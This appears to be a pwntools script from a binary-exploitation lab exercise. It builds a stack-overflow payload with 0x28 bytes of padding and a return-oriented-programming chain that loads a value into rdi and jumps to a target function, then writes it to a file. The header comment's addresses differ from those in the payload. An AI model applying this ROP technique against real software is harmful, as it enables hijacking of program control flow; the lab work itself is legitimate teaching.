"""
cond: %edx === 0x6044e4
touch2 -> 0x4017ec
mov %edx, $0x6044e4
jmp 0x4017ec
"""

from pwn import *
context(arch='amd64', os='linux')

r = b''
r += b'a' * 0x28
r += p64(0x00000000004022ee) # 0x00000000004022ee : pop rax ; ret
r += p64(0x5ff762f9)
r += p64(0x00000000004022d7) # 0x00000000004022d7 : mov rdi, rax ; ret 
r += p64(0x000000000040201e)

with open('pr2.bin', 'wb') as f:
  f.write(r)
